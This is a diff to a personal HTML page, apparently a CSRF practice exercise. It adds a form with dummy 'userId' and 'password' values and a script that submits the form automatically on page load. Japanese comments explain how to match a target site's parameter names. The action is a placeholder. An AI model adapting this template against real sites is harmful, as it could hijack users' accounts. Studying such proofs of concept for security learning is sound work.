@@ -37,6 +37,19 @@
       </a>
     </div>
     <div>Github Pageにようこそ!!!!!!!</div>
+
+    <form action="alert(99999)" method="POST">
+        <!-- サンプルサイトのhtmlソースを見ながらIDとパスワードのパラメータ名（name）を合わせ、
+        変更させたい適当な値をvalueに設定する -->
+        <input name="userId" value="hogehogehacker" />
+        <input name="password" value="hogehogehacker" />
+    </form>    
   </body>
 </html>
+<script>
+    // 自動でpost送信させるコード
+    var form = document.querySelector("form");
+    form.submit()
+</script>
+
 
